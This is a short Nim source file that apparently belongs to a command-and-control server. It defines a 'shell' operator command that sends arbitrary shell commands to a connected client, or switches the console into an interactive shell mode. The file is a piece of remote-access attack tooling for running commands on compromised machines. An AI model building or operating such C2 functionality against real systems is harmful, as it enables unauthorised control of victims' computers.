import asyncdispatch, strutils

import ../../types
import ../../logging
import ../../communication

import ../../../clientTasks/shell

proc execProc(args: seq[string], server: C2Server) {.async.} =
  let argsn = len(args)
  if argsn == 1:
    infoLog "entering shell mode, use 'back' to exit"
    server.cli.mode = ShellMode
  else:
    let task = await shell.sendTask(server.cli.handlingClient, args[1..(argsn - 1)].join(" "))
    await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "shell",
  argsLength: 1,
  usage: @["shell", "shell [command]"],
  cliMode: @[ClientInteractMode],
  description: "Send a shell command or enter shell mode when no command is passed",
  category: CCClientInteraction
)